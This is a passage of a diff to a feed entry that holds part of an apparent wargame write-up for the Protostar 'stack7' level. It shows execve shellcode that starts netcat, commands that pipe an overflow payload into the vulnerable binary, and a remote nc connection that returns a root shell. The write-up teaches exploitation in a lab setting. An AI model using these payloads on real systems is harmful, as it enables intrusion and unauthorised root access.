-<span class="nf">push</span> <span class="nb">ebx</span>
-<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
-<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c1">; execve()</span>
-<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> nasm ~/sc-tmp-nc.asm
-<span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
-<span class="gp">$</span> cp /home/user/netcat /tmp/nc
-<span class="gp">$</span> cat /home/user/sc-tmp-nc <span class="p">|</span> wc -c
-<span class="go">25</span>
-<span class="go">got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��</span>
-<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/sc-tmp-nc<span class="k">)$(</span>~/try-address.sh <span class="m">55</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> ./stack7
-<span class="go">input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
-<span class="go">&lt;waiting&gt;</span></code></pre></div>
-
-<p>On a remote machine:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
-<span class="go">whoami</span>
-<span class="go">root</span></code></pre></div>
 
 ]]></content>
   </entry>
